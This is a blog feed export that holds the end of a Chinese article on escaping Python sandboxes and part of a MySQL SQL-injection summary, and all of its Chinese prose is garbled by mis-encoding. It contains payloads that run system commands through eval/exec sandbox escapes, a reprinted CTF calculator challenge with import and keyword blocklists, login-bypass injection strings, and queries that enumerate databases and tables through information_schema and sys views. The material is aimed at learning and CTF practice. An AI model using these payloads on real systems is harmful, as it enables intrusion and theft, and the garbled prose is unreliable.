ä¸ºæœ‰ä¸¤ç§å§¿åŠ¿ï¼š</p><ul><li>åˆ©ç”¨è£…é¥°å™¨ <code>@</code></li><li>åˆ©ç”¨é­”æœ¯æ–¹æ³•ï¼Œä¾‹å¦‚ <code>enum.EnumMeta.__getitem__</code>ï¼Œ</li></ul><p>åˆ©ç”¨è¿™ä¸¤ç§å§¿åŠ¿ï¼Œæˆ‘åœ¨ã€ŠOrangeKiller CTF ç¬¬ 2 æœŸã€‹ä¸­å‡ºäº† 2 é“é¢˜ç›®ï¼Œé¢˜è§£ç¯‡å†™çš„å¾ˆè¯¦ç»†ï¼Œç§»æ­¥å»çœ‹å§ï¼š<a href="https://www.tr0y.wang/2022/06/27/OrangeKiller_CTF_2_wp/">ä¼ é€é—¨</a></p><h3 id="åˆ©ç”¨æ–°ç‰¹æ€§"><a href="#åˆ©ç”¨æ–°ç‰¹æ€§" class="headerlink" title="åˆ©ç”¨æ–°ç‰¹æ€§"></a><strong>åˆ©ç”¨æ–°ç‰¹æ€§</strong></h3><p>PEP 498 å¼•å…¥äº† <code>f-string</code>ï¼Œåœ¨ 3.6 å¼€å§‹å‡ºç°ï¼š<a href="https://docs.python.org/3.6/whatsnew/3.6.html#new-features">ä¼ é€é—¨ğŸšª</a>ï¼Œé£Ÿç”¨æ–¹å¼ï¼š<a href="https://docs.python.org/3.6/reference/lexical_analysis.html#f-strings">ä¼ é€é—¨ğŸšª</a>ã€‚æ‰€ä»¥æˆ‘ä»¬å°±æœ‰äº†ä¸€ç§èˆ¹æ–°çš„åˆ©ç”¨æ–¹å¼ï¼š</p><pre class="language-none"><code class="language-none">&gt;&gt;&gt; f'{__import__("os").system("whoami")}'macr0phag3'0'PYTHON</code></pre><p> å…³æ³¨æ¯æ¬¡ç‰ˆæœ¬å¢åŠ çš„æ–°ç‰¹æ€§ï¼Œæˆ–è®¸èƒ½æ·˜åˆ°ç‚¹å®è´ã€‚</p><h3 id="åˆ©ç”¨ååºåˆ—åŒ–æ”»å‡»"><a href="#åˆ©ç”¨ååºåˆ—åŒ–æ”»å‡»" class="headerlink" title="åˆ©ç”¨ååºåˆ—åŒ–æ”»å‡»"></a><strong>åˆ©ç”¨å</strong>åºåˆ—åŒ–<strong>æ”»å‡»</strong></h3><p>ååºåˆ—åŒ–æ”»å‡»ä¹Ÿæ˜¯èƒ½ç”¨æ¥é€ƒé€¸ï¼Œä½†æ˜¯å…³äºååºåˆ—åŒ–æ”»å‡»çš„å®‰å…¨é—®é¢˜è¿˜æŒºå¤šçš„ï¼Œè§è¿™ç¯‡æ–‡ç« ï¼Œè§ï¼š<a href="https://www.tr0y.wang/2022/02/03/SecMap-unserialize-python/">ä¼ é€é—¨ğŸšª</a></p><h2 id="ğŸŒ°"><a href="#ğŸŒ°" class="headerlink" title="ğŸŒ°"></a><strong>ğŸŒ°</strong></h2><p>è¿™ä¸ªä¾‹å­æ¥è‡ª<code>iscc 2016</code>çš„<code>Pwn300 pycalc</code>ï¼Œç›¸å½“æœ‰è¶£ï¼š</p><pre class="language-none"><code class="language-none">#!/usr/bin/env python2# -*- coding:utf-8 -*-def banner(): print "=============================================" print " Simple calculator implemented by python " print "=============================================" returndef getexp(): return raw_input("&gt;&gt;&gt; ")def _hook_import_(name, *args, **kwargs): module_blacklist = ['os', 'sys', 'time', 'bdb', 'bsddb', 'cgi', 'CGIHTTPServer', 'cgitb', 'compileall', 'ctypes', 'dircache', 'doctest', 'dumbdbm', 'filecmp', 'fileinput', 'ftplib', 'gzip', 'getopt', 'getpass', 'gettext', 'httplib', 'importlib', 'imputil', 'linecache', 'macpath', 'mailbox', 'mailcap', 'mhlib', 'mimetools', 'mimetypes', 'modulefinder', 'multiprocessing', 'netrc', 'new', 'optparse', 'pdb', 'pipes', 'pkgutil', 'platform', 'popen2', 'poplib', 'posix', 'posixfile', 'profile', 'pstats', 'pty', 'py_compile', 'pyclbr', 'pydoc', 'rexec', 'runpy', 'shlex', 'shutil', 'SimpleHTTPServer', 'SimpleXMLRPCServer', 'site', 'smtpd', 'socket', 'SocketServer', 'subprocess', 'sysconfig', 'tabnanny', 'tarfile', 'telnetlib', 'tempfile', 'Tix', 'trace', 'turtle', 'urllib', 'urllib2', 'user', 'uu', 'webbrowser', 'whichdb', 'zipfile', 'zipimport'] for forbid in module_blacklist: if name == forbid: # don't let user import these modules raise RuntimeError('No you can\' import {0}!!!'.format(forbid)) # normal modules can be imported return __import__(name, *args, **kwargs)def sandbox_filter(command): blacklist = ['exec', 'sh', '__getitem__', '__setitem__', '=', 'open', 'read', 'sys', ';', 'os'] for forbid in blacklist: if forbid in command: return 0 return 1def sandbox_exec(command): # sandbox user input result = 0 __sandboxed_builtins__ = dict(__builtins__.__dict__) __sandboxed_builtins__['__import__'] = _hook_import_ # hook import del __sandboxed_builtins__['open'] _global = { '__builtins__': __sandboxed_builtins__ } if sandbox_filter(command) == 0: print 'Malicious user input detected!!!' exit(0) command = 'result = ' + command try: exec command in _global # do calculate in a sandboxed environment except Exception, e: print e return 0 result = _global['result'] # extract the result return resultbanner()while 1: command = getexp() print sandbox_exec(command)PYTHON</code></pre><p><code>exec command in _global</code> è¿™ä¸€å¥å°±æŠŠå¾ˆå¤š payload å¹²æ‰äº†ï¼Œç”±äº exec è¿è¡Œåœ¨è‡ªå®šä¹‰çš„å…¨å±€å‘½åç©ºé—´é‡Œï¼Œè¿™æ—¶å€™ä¼šå¤„äº<code>restricted execution mode</code>ï¼Œè¿™é‡Œä¸èµ˜è¿°äº†ï¼Œæ„Ÿå…´è¶£å¯ä»¥çœ‹è¿™ç¯‡æ–‡ç« ï¼š<a href="http://tav.espians.com/paving-the-way-to-securing-the-python-interpreter.html">ä¼ é€é—¨ğŸšª</a>ã€‚exec åŠ ä¸Šå®šåˆ¶çš„ globals ä¼šä½¿å¾—æ²™ç®±å®‰å…¨å¾ˆå¤šï¼Œä¸€äº›å¸¸è§„çš„ payload æ˜¯æ²¡æ³•ä½¿ç”¨çš„ï¼Œä¾‹å¦‚ï¼š</p><pre class="language-none"><code class="language-none">&gt;&gt;&gt; ''.__class__.__mro__[-1].__subclasses__()[71]._Printer__setup.__globals__restricted attribute&gt;&gt;&gt; getattr(getattr(__import__('types'), 'FileType')('key'), 're''ad')()file() constructor not accessible in restricted modeDELPHI</code></pre><p> ä¸è¿‡ä¹Ÿæ­£æ˜¯ç”±äº exec è¿è¡Œåœ¨ç‰¹å®šçš„å‘½åç©ºé—´é‡Œï¼Œå¯ä»¥é€šè¿‡å…¶ä»–å‘½åç©ºé—´é‡Œçš„ <code>__builtins__</code>ï¼Œæ¯”å¦‚ types åº“ï¼Œæ¥æ‰§è¡Œä»»æ„å‘½ä»¤ï¼š</p><pre class="language-none"><code class="language-none">&gt;&gt;&gt; getattr(__import__('types').__builtins__['__tropmi__'[::-1]]('so'[::-1]), 'mets' 'ys'[::-1])('whoami')macr0phag3LISP</code></pre><h3 id="æç«¯é™åˆ¶"><a href="#æç«¯é™åˆ¶" class="headerlink" title="æç«¯é™åˆ¶"></a><strong>æç«¯é™åˆ¶</strong></h3><p>è¿™ç§é™åˆ¶ä¸€èˆ¬æ˜¯ç»„åˆå½¢å¼å‡ºç°ï¼Œè€Œä¸”é€šå¸¸åªä¼šå‡ºç°åœ¨ CTF ä¸­ã€‚</p><blockquote><p>é™åˆ¶è¾“å…¥å­—ç¬¦çš„é›†åˆçš„å¤§å°</p></blockquote><p>æ€è·¯å°±æ˜¯å…ˆç¡®å®šä¸å¾—ä¸ç”¨åˆ°çš„å­—ç¬¦ï¼Œå†çœ‹è¿™äº›å­—ç¬¦èƒ½å¤Ÿæ‹¼å‡ºå“ªäº›å‡½æ•°æˆ–è€…å¸¸é‡ã€‚</p><p>åœ¨ã€ŠOrangeKiller CTF ç¬¬ 2 æœŸã€‹ä¸­å‡ºäº† 3 é“é¢˜ç›®ä¸æ­¤ç›¸å…³ï¼Œç§»æ­¥å»çœ‹å§ï¼š<a href="https://www.tr0y.wang/2022/06/27/OrangeKiller_CTF_2_wp/">ä¼ é€é—¨</a></p><blockquote><p>é™åˆ¶ä¸èƒ½ä½¿ç”¨ <code>[a-zA-Z]</code> çš„å­—ç¬¦</p></blockquote><p>æˆ‘åœ¨ <a href="https://www.tr0y.wang/2020/08/18/IDN/#%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF">ã€Šä»ä¸€ä¸ªç»•è¿‡é•¿åº¦é™åˆ¶çš„ XSS ä¸­ï¼Œæˆ‘ä»¬èƒ½å­¦åˆ°ä»€ä¹ˆï¼Ÿã€‹</a> ä¸­æåˆ°è¿‡ï¼ŒPython3 æ”¯æŒäº† Unicode å˜é‡åä¸”è§£é‡Šå™¨åœ¨åšä»£ç è§£æçš„æ—¶å€™ï¼Œä¼šå¯¹å˜é‡åè¿›è¡Œè§„èŒƒåŒ–ï¼Œç®—æ³•æ˜¯ <code>NFKC</code>ã€‚</p><p>æ‰€ä»¥åœ¨è¿™ç§æƒ…å†µä¸‹å¯ä»¥ç”¨è¿™ç§å§¿åŠ¿ï¼š</p><pre class="language-none"><code class="language-none">eval == áµ‰valPYTHON</code></pre><blockquote><p>socket + ä¸¥æ ¼çš„è¾“å…¥é™åˆ¶</p></blockquote><p>å¯ä»¥çœ‹çœ‹æ˜¯å¦æ¼æ‰äº† <code>help</code>ï¼Œæ¼æ‰çš„è¯ï¼Œå…ˆé€šè¿‡ <code>help()</code> è°ƒèµ· vi/vimï¼Œç„¶åç”¨ <code>!</code> æŒ‡ä»¤å³å¯ getshell :)</p><p>å‚è€ƒï¼š<a href="https://www.tr0y.wang/2019/05/06/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/#%E9%80%9A%E8%BF%87%E7%BB%A7%E6%89%BF%E5%85%B3%E7%B3%BB%E9%80%83%E9%80%B8">https://www.tr0y.wang/2019/05/06/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/#%E9%80%9A%E8%BF%87%E7%BB%A7%E6%89%BF%E5%85%B3%E7%B3%BB%E9%80%83%E9%80%B8</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> webå®‰å…¨ </tag>
            
            <tag> pythonå®‰å…¨ </tag>
            
            <tag> è¿›é˜¶å­¦ä¹  </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlæ³¨å…¥æ¼æ´æ€»ç»“</title>
      <link href="/2023/08/23/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-mysql/"/>
      <url>/2023/08/23/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-mysql/</url>
      
        <content type="html"><![CDATA[<p>æ²™ä¸Šæœ‰å°ï¼Œå…‰ä¸­æœ‰</p><hr><h1 id="SQLæ³¨å…¥æ€»ç»“"><a href="#SQLæ³¨å…¥æ€»ç»“" class="headerlink" title="SQLæ³¨å…¥æ€»ç»“"></a>SQLæ³¨å…¥æ€»ç»“</h1><h2 id="åŸºç¡€çŸ¥è¯†"><a href="#åŸºç¡€çŸ¥è¯†" class="headerlink" title="åŸºç¡€çŸ¥è¯†"></a>åŸºç¡€çŸ¥è¯†</h2><h3 id="ç³»ç»Ÿå‡½æ•°"><a href="#ç³»ç»Ÿå‡½æ•°" class="headerlink" title="ç³»ç»Ÿå‡½æ•°"></a>ç³»ç»Ÿå‡½æ•°</h3><blockquote><p>system_user()â€”â€”ç³»ç»Ÿç”¨æˆ·å</p><p>user()â€”â€”ç”¨æˆ·å</p><p>current_user()â€”â€”å½“å‰ç”¨æˆ·å</p><p>session_user()â€”â€”é“¾æ¥æ•°æ®åº“çš„ç”¨æˆ·å</p><p>database()â€”â€”æ•°æ®åº“å</p><p>version()â€”â€”æ•°æ®åº“ç‰ˆæœ¬</p><p>@@datadirâ€”â€”æ•°æ®åº“è·¯å¾„</p><p>@@basedirâ€”â€”æ•°æ®åº“å®‰è£…è·¯å¾„</p><p>@@version_conpile_osâ€”â€”æ“ä½œç³»ç»Ÿ</p></blockquote><h3 id="å­—ç¬¦ä¸²è¿æ¥å‡½æ•°"><a href="#å­—ç¬¦ä¸²è¿æ¥å‡½æ•°" class="headerlink" title="å­—ç¬¦ä¸²è¿æ¥å‡½æ•°"></a>å­—ç¬¦ä¸²è¿æ¥å‡½æ•°</h3><blockquote><p>concat(str1,str2,â€¦)â€”â€”æ²¡æœ‰åˆ†éš”ç¬¦åœ°è¿æ¥å­—ç¬¦ä¸²</p><p>concat_ws(separator,str1,str2,â€¦)â€”â€”å«æœ‰åˆ†éš”ç¬¦åœ°è¿æ¥å­—ç¬¦ä¸²</p><p>group_concat(str1,str2,â€¦)â€”â€”è¿æ¥ä¸€ä¸ªç»„çš„æ‰€æœ‰å­—ç¬¦ä¸²ï¼Œå¹¶ä»¥é€—å·åˆ†éš”æ¯ä¸€æ¡æ•°æ®ã€‚</p></blockquote><h3 id="ä¸€èˆ¬ç”¨äºå°è¯•çš„è¯­å¥"><a href="#ä¸€èˆ¬ç”¨äºå°è¯•çš„è¯­å¥" class="headerlink" title="ä¸€èˆ¬ç”¨äºå°è¯•çš„è¯­å¥"></a>ä¸€èˆ¬ç”¨äºå°è¯•çš„è¯­å¥</h3><p>â€“+å¯ä»¥ç”¨#æ›¿æ¢ï¼Œurl æäº¤è¿‡ç¨‹ä¸­Url ç¼–ç åçš„#ä¸º%23</p><pre class="language-none"><code class="language-none">or 1=1--+'or 1=1--+"or 1=1--+)or 1=1--+')or 1=1--+") or 1=1--+"))or 1=1--+ä¸€èˆ¬çš„ä»£ç ä¸ºï¼š$id=$_GET['id'];$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";</code></pre><p>æ­¤å¤„è€ƒè™‘ä¸¤ä¸ªç‚¹ï¼Œä¸€ä¸ªæ˜¯é—­åˆå‰é¢ä½ çš„â€˜ å¦ä¸€ä¸ªæ˜¯å¤„ç†åé¢çš„â€˜ ï¼Œä¸€èˆ¬é‡‡ç”¨ä¸¤ç§æ€è·¯ï¼Œé—­åˆåé¢çš„å¼•å·æˆ–è€…æ³¨é‡Šæ‰ï¼Œæ³¨é‡Šæ‰é‡‡ç”¨â€“+ æˆ–è€…#ï¼ˆ%23ï¼‰</p><h3 id="union-æ“ä½œç¬¦çš„ä»‹ç»"><a href="#union-æ“ä½œç¬¦çš„ä»‹ç»" class="headerlink" title="union æ“ä½œç¬¦çš„ä»‹ç»"></a>union æ“ä½œç¬¦çš„ä»‹ç»</h3><p>è”åˆæŸ¥è¯¢æ˜¯å¯åˆå¹¶å¤šä¸ªç›¸ä¼¼çš„é€‰æ‹©æŸ¥è¯¢çš„ç»“æœé›†ã€‚ç­‰åŒäºå°†ä¸€ä¸ªè¡¨è¿½åŠ åˆ°å¦ä¸€ä¸ªè¡¨ï¼Œä»è€Œå®ç°å°†ä¸¤ä¸ªè¡¨çš„æŸ¥è¯¢ç»„åˆåˆ°ä¸€èµ·ï¼Œä½¿ç”¨è°“è¯ä¸ºUNIONæˆ–UNION ALLã€‚å°†å¤šä¸ªæŸ¥è¯¢çš„ç»“æœåˆå¹¶åˆ°ä¸€èµ·ï¼ˆçºµå‘åˆå¹¶ï¼‰ï¼šå­—æ®µæ•°ä¸å˜ï¼Œå¤šä¸ªæŸ¥è¯¢çš„è®°å½•æ•°åˆå¹¶ã€‚</p><p>åŸºæœ¬è¯­æ³•ï¼š</p><blockquote><p>Select è¯­å¥</p><p>Union [union é€‰é¡¹]</p><p>Select è¯­å¥;</p><p>Unioné€‰é¡¹ï¼šä¸selecté€‰é¡¹åŸºæœ¬ä¸€æ ·</p><p>Distinctï¼šå»é‡ï¼Œå»æ‰å®Œå…¨é‡å¤çš„æ•°æ®ï¼ˆé»˜è®¤çš„ï¼‰</p><p>Allï¼šä¿å­˜æ‰€æœ‰çš„ç»“æœ</p></blockquote><pre class="language-none"><code class="language-none">SELECT column_name(s) FROM table_name1UNION [distinct] --é»˜è®¤ä¸ºdistinct                 --å¦‚æœå…è®¸é‡å¤å€¼å°±æ”¹ä¸ºAllSELECT column_name(s) FROM table_name2</code></pre><p>unionç†è®ºä¸Šåªè¦ä¿è¯å­—æ®µæ•°ä¸€æ ·ï¼Œä¸éœ€è¦æ¯æ¬¡æ‹¿åˆ°çš„æ•°æ®å¯¹åº”çš„å­—æ®µç±»å‹ä¸€è‡´ã€‚æ°¸è¿œåªä¿ç•™ç¬¬ä¸€ä¸ªselectè¯­å¥å¯¹åº”çš„å­—æ®µåå­—ã€‚</p><h3 id="sql-ä¸­çš„é€»è¾‘è¿ç®—"><a href="#sql-ä¸­çš„é€»è¾‘è¿ç®—" class="headerlink" title="sql ä¸­çš„é€»è¾‘è¿ç®—"></a>sql ä¸­çš„é€»è¾‘è¿ç®—</h3><pre class="language-none"><code class="language-none">Select * from users where id=1 and 1=1;</code></pre><p> è¿™æ¡è¯­å¥ä¸ºä»€ä¹ˆèƒ½å¤Ÿé€‰æ‹©å‡ºid=1çš„å†…å®¹ï¼Œand 1=1 åˆ°åº•èµ·ä½œç”¨äº†æ²¡æœ‰ï¼Ÿè¿™é‡Œå°±è¦æ¸…æ¥šsql è¯­å¥æ‰§è¡Œé¡ºåºäº†ã€‚ åŒæ—¶è¿™ä¸ªé—®é¢˜æˆ‘ä»¬åœ¨ä½¿ç”¨ä¸‡èƒ½å¯†ç çš„æ—¶å€™ä¼šç”¨åˆ°ã€‚Select <em>from admin where username=â€™adminâ€™ and password=â€™adminâ€™æˆ‘ä»¬å¯ä»¥ç”¨â€™or 1=1# ä½œä¸ºå¯†ç è¾“å…¥ã€‚åŸå› æ˜¯ä¸ºä»€ä¹ˆï¼Ÿè¿™é‡Œæ¶‰åŠåˆ°ä¸€ä¸ªé€»è¾‘è¿ç®—ï¼Œå½“ä½¿ç”¨ä¸Šè¿°æ‰€è°“çš„ä¸‡èƒ½å¯†ç åï¼Œæ„æˆçš„sql è¯­å¥ä¸ºï¼šSelect</em> from admin where username=â€™adminâ€™ and password=â€™â€™or 1=1#â€™  Explain:ä¸Šé¢çš„è¿™ä¸ªè¯­å¥æ‰§è¡Œåï¼Œæˆ‘ä»¬åœ¨ä¸çŸ¥é“å¯†ç çš„æƒ…å†µä¸‹å°±ç™»å½•åˆ°äº†admin ç”¨æˆ·äº†ã€‚åŸå› æ˜¯åœ¨where å­å¥åï¼Œ æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸‰ä¸ªæ¡ä»¶è¯­å¥username=â€™adminâ€™ andpassword=â€™â€™or 1=1ã€‚ä¸‰ä¸ªæ¡ä»¶ç”¨and å’Œor è¿›è¡Œè¿æ¥ã€‚åœ¨sql ä¸­ï¼Œæˆ‘ä»¬and çš„è¿ç®—ä¼˜å…ˆçº§å¤§äºor çš„å…ƒç®—ä¼˜å…ˆçº§ã€‚å› æ­¤å¯ä»¥çœ‹åˆ°ç¬¬ä¸€ä¸ªæ¡ä»¶ï¼ˆç”¨a è¡¨ç¤ºï¼‰æ˜¯çœŸçš„ï¼Œç¬¬äºŒä¸ªæ¡ä»¶ï¼ˆç”¨b è¡¨ç¤ºï¼‰æ˜¯å‡çš„ï¼Œa and b = false,ç¬¬ä¸€ä¸ªæ¡ä»¶å’Œç¬¬äºŒä¸ªæ¡ä»¶æ‰§è¡Œand åæ˜¯å‡ï¼Œå†ä¸ç¬¬ä¸‰ä¸ªæ¡ä»¶or è¿ç®—ï¼Œå› ä¸ºç¬¬ä¸‰ä¸ªæ¡ä»¶1=1 æ˜¯æ’æˆç«‹çš„ï¼Œæ‰€ä»¥ç»“æœè‡ªç„¶å°±ä¸ºçœŸäº†ã€‚å› æ­¤ä¸Šè¿°çš„è¯­å¥å°±æ˜¯æ’çœŸäº†ã€‚.</p><p>â‘ Select <em>from users where id=1 and 1=1;</em> <em>â‘¡Select</em> from users where id=1 &amp;&amp; 1=1; â‘¢Select * from users where id=1 &amp; 1=1; ä¸Šè¿°ä¸‰è€…æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿâ‘ å’Œâ‘¡æ˜¯ä¸€æ ·çš„ï¼Œè¡¨è¾¾çš„æ„æ€æ˜¯id=1 æ¡ä»¶å’Œ1=1 æ¡ä»¶è¿›è¡Œä¸è¿ç®—ã€‚ â‘¢çš„æ„æ€æ˜¯id=1 æ¡ä»¶ä¸1 è¿›è¡Œ&amp;ä½æ“ä½œï¼Œid=1 è¢«å½“ä½œtrueï¼Œä¸1 è¿›è¡Œ&amp; è¿ç®—ç»“æœè¿˜æ˜¯1ï¼Œå†è¿›è¡Œ=æ“ä½œï¼Œ1=1,è¿˜æ˜¯1ï¼ˆpsï¼š&amp;çš„ä¼˜å…ˆçº§å¤§äº=ï¼‰ Ps:æ­¤å¤„è¿›è¡Œçš„ä½è¿ç®—ã€‚æˆ‘ä»¬å¯ä»¥å°†æ•°è½¬æ¢ä¸ºäºŒè¿›åˆ¶å†è¿›è¡Œä¸ã€æˆ–ã€éã€å¼‚æˆ–ç­‰è¿ç®—ã€‚å¿…è¦çš„æ—¶å€™å¯ä»¥åˆ©ç”¨è¯¥æ–¹æ³•è¿›è¡Œæ³¨å…¥ç»“æœã€‚ä¾‹å¦‚å°†æŸä¸€å­—ç¬¦è½¬æ¢ä¸ºascii ç åï¼Œå¯ä»¥åˆ†åˆ«ä¸1,2,4,8,16,32.ã€‚ã€‚ã€‚è¿›è¡Œä¸è¿ç®—ï¼Œå¯ä»¥å¾—åˆ°æ¯ä¸€ä½çš„å€¼ï¼Œæ‹¼æ¥èµ·æ¥å°±æ˜¯ascii ç å€¼ã€‚å†ä»ascii å€¼åæ¨å›å­—ç¬¦ã€‚ï¼ˆè¿ç”¨è¾ƒå°‘ï¼‰</p><h3 id="order-byä»‹ç»"><a href="#order-byä»‹ç»" class="headerlink" title="order byä»‹ç»"></a>order byä»‹ç»</h3><p>åœ¨mysqlä¸­order byæ˜¯ç”¨æ¥æ ¹æ®æ ¡å¯¹è§„åˆ™å¯¹æ•°æ®è¿›è¡Œæ’åº</p><p>åŸºæœ¬è¯­æ³•ï¼šorder by å­—æ®µ [asc|desc]; //ascå‡åºï¼Œé»˜è®¤çš„</p><p>å¹¶ä¸”order byè¿˜å¯ä»¥å¤šå­—æ®µæ’åºï¼Œå…ˆæŒ‰ç…§ç¬¬ä¸€ä¸ªå­—æ®µè¿›è¡Œæ’åºï¼Œç„¶åå†æŒ‰ç…§ç¬¬äºŒä¸ªå­—æ®µè¿›è¡Œæ’åºã€‚</p><p>å› æ­¤åœ¨sqlæ³¨å…¥ä¸­å¯ä»¥é€šè¿‡order byæ¥åˆ¤æ–­è¡¨ä¸­æœ‰å¤šå°‘å­—æ®µï¼Œå¹¶ä¸”å¹¶ä¸éœ€è¦çŸ¥é“å­—æ®µçš„åå­—æ˜¯ä»€ä¹ˆï¼Œé€šè¿‡æ•°å­—1ã€2ã€3ç­‰ä¹Ÿå¯ä»¥æ’åºï¼Œå› ä¸ºåœ¨mysqlä¸­å­—æ®µçš„åå­—ä¹Ÿå¯ä»¥ç”¨è¿‡1ã€2ã€3ç­‰æ¥è¡¨ç¤ºã€‚</p><p>å‚æ•°é»˜è®¤æ˜¯ascï¼Œå¯ä»¥ä¸ç”¨åŠ ã€‚</p><p>å½“order byä¸­çš„å­—æ®µæ•°ä¸º3æ—¶ï¼Œç”±äºè¡¨ä¸­å­—æ®µæ•°ä¸è¶³ï¼Œåˆ™æŠ¥é”™ã€‚å› æ­¤å¯åˆ¤æ–­å­—æ®µæ•°ä¸º2.</p><h3 id="æ³¨å…¥æµç¨‹"><a href="#æ³¨å…¥æµç¨‹" class="headerlink" title="æ³¨å…¥æµç¨‹"></a>æ³¨å…¥æµç¨‹</h3><p>æˆ‘ä»¬çš„æ•°æ®åº“å­˜å‚¨çš„æ•°æ®æŒ‰ç…§ä¸Šå›¾çš„å½¢å¼ï¼Œä¸€ä¸ªæ•°æ®åº“å½“ä¸­æœ‰å¾ˆå¤šçš„æ•°æ®è¡¨ï¼Œæ•°æ®è¡¨å½“ä¸­æœ‰å¾ˆå¤šçš„åˆ—ï¼Œæ¯ä¸€åˆ—å½“ä¸­å­˜å‚¨ç€æ•°æ®ã€‚æˆ‘ä»¬æ³¨å…¥çš„è¿‡ç¨‹å°±æ˜¯å…ˆæ‹¿åˆ°æ•°æ®åº“åï¼Œåœ¨è·å–åˆ°å½“å‰æ•°æ®åº“åä¸‹çš„æ•°æ®è¡¨ï¼Œå†è·å–å½“å‰æ•°æ®è¡¨ä¸‹çš„åˆ—ï¼Œæœ€åè·å–æ•°æ®ã€‚</p><h3 id="ç³»ç»Ÿæ•°æ®åº“ï¼ˆinformation-schemaï¼‰"><a href="#ç³»ç»Ÿæ•°æ®åº“ï¼ˆinformation-schemaï¼‰" class="headerlink" title="ç³»ç»Ÿæ•°æ®åº“ï¼ˆinformation_schemaï¼‰"></a>ç³»ç»Ÿæ•°æ®åº“ï¼ˆinformation_schemaï¼‰</h3><p> åœ¨mysql 5.0ç‰ˆæœ¬ä¹‹åï¼Œmysqlé»˜è®¤åœ¨æ•°æ®åº“ä¸­å­˜æ”¾ä¸€ä¸ªâ€information_schemaâ€çš„æ•°æ®åº“ï¼Œåœ¨è¯¥åº“ä¸­ï¼Œéœ€è¦è®°ä½ä¸‰ä¸ªè¡¨åï¼Œåˆ†åˆ«æ˜¯schemataã€tablesã€cliumnsã€‚</p><p> schemataè¡¨å­˜å‚¨è¯¥ç”¨æˆ·åˆ›å»ºçš„æ‰€æœ‰æ•°æ®åº“çš„åº“åã€‚</p><p>é€šè¿‡schemataè¡¨æˆ‘ä»¬å°±å¯ä»¥çŒœæ•°æ®åº“äº†</p><pre class="language-none"><code class="language-none">select schema_name from information_schema.schemata;</code></pre><p>tablesè¡¨å­˜å‚¨è¯¥ç”¨æˆ·åˆ›å»ºçš„æ‰€æœ‰æ•°æ®åº“çš„åº“åå’Œè¡¨åã€‚</p><p>é€šè¿‡tablesè¡¨æˆ‘ä»¬å°±å¯ä»¥çŒœæŸåº“çš„æ•°æ®è¡¨</p><pre class="language-none"><code class="language-none">select table_name from information_schema.tables where table_schema=â€™xxxxxâ€™;</code></pre><p>columnsè¡¨å­˜å‚¨è¯¥ç”¨æˆ·</p><p>é€šè¿‡columnsè¡¨æˆ‘ä»¬å°±å¯ä»¥çŒœæŸè¡¨çš„æ‰€æœ‰åˆ—</p><pre class="language-none"><code class="language-none">Select column_name from information_schema.columns where table_name=â€™xxxxxâ€™;</code></pre><p>æœ€åè·å–æŸåˆ—çš„æ•°æ®</p><pre class="language-none"><code class="language-none">Select xxxx from xxxx</code></pre><p><strong>å½“information_schemaè¢«å±è”½æ—¶ï¼Œå¯ä½¿ç”¨å…¶ä»–çš„è¡¨</strong></p><p>å¯ä»¥å‚è€ƒè¿™è¾¹æ–‡ç« ï¼š<a href="https://www.anquanke.com/post/id/193512">https://www.anquanke.com/post/id/193512</a></p><p><strong>innodbè¡¨</strong></p><p>MySQL 5.6 åŠä»¥ä¸Šç‰ˆæœ¬å­˜åœ¨<code>innodb_index_stats</code>ï¼Œ<code>innodb_table_stats</code>ä¸¤å¼ è¡¨ï¼Œå…¶ä¸­åŒ…å«æ–°å»ºç«‹çš„åº“å’Œè¡¨</p><pre class="language-none"><code class="language-none">select table_name from mysql.innodb_table_stats where database_name = database(); select table_name from mysql.innodb_index_stats where database_name = database();</code></pre><p><strong>sysè¡¨</strong></p><p>åœ¨MySQL 5.7.9ä¸­sysä¸­æ–°å¢äº†ä¸€äº›è§†å›¾ï¼Œå¯ä»¥ä»ä¸­è·å–è¡¨å</p><pre class="language-none"><code class="language-none">#åŒ…å«inSELECT object_name FROM `sys`.`x$innodb_buffer_stats_by_table` where object_schema = database();SELECT object_name FROM `sys`.`innodb_buffer_stats_by_table` WHERE object_schema = DATABASE();SELECT TABLE_NAME FROM `sys`.`x$schema_index_statistics` WHERE TABLE_SCHEMA = DATABASE();SELECT TABLE_NAME FROM `sys`.`schema_auto_increment_columns` WHERE TABLE_SCHEMA = DATABASE();SELECT table_schema FROM sys.schema_table_statistics GROUP BY table_schema;#ä¸åŒ…å«inSELECT TABLE_NAME FROM `sys`.`x$schema_flattened_keys` WHERE TABLE_SCHEMA = DATABASE();SELECT TABLE_NAME FROM `sys`.`x$ps_schema_table_statistics_io` WHERE TABLE_SCHEMA = DATABASE();SELECT TABLE_NAME FROM `sys`.`x$schema_table_statistics_with_buffer` WHERE TABLE_SCHEMA = DATABASE();SELECT table_schema FROM sys.x$schema_flattened_keys GROUP BY table_schema;#é€šè¿‡è¡¨æ–‡ä»¶çš„å­˜å‚¨è·¯å¾„è·å–è¡¨åSELECT FILE FROM `sys`.`io_global_by_file_by_bytes` WHERE FILE REGEXP DATABASE();SELECT FILE FROM `sys`.`io_global_by_file_by_latency` WHERE FILE REGEXP DATABASE();SELECT FILE FROM `sys`.`x$io_global_by_file_by_bytes` WHERE FILE REGEXP DATABASE();#æŸ¥è¯¢æŒ‡å®šåº“çš„è¡¨ï¼ˆè‹¥æ— åˆ™è¯´æ˜æ­¤è¡¨ä»æœªè¢«è®¿é—®ï¼‰SELECT table_name FROM sys.schema_table_statistics WHERE table_schema='mspwd' GROUP BY table_name;SELECT table_name FROM sys.x$schema_flattened_keys WHERE table_schema='mspwd' GROUP BY table_name;#ç»Ÿè®¡æ‰€æœ‰è®¿é—®è¿‡çš„è¡¨æ¬¡æ•°:åº“å,è¡¨å,è®¿é—®æ¬¡æ•°select table_schema,table_name,sum(io_read_requests+io_write_requests) io from sys.schema_table_statistics group bytable_schema,table_name order by io 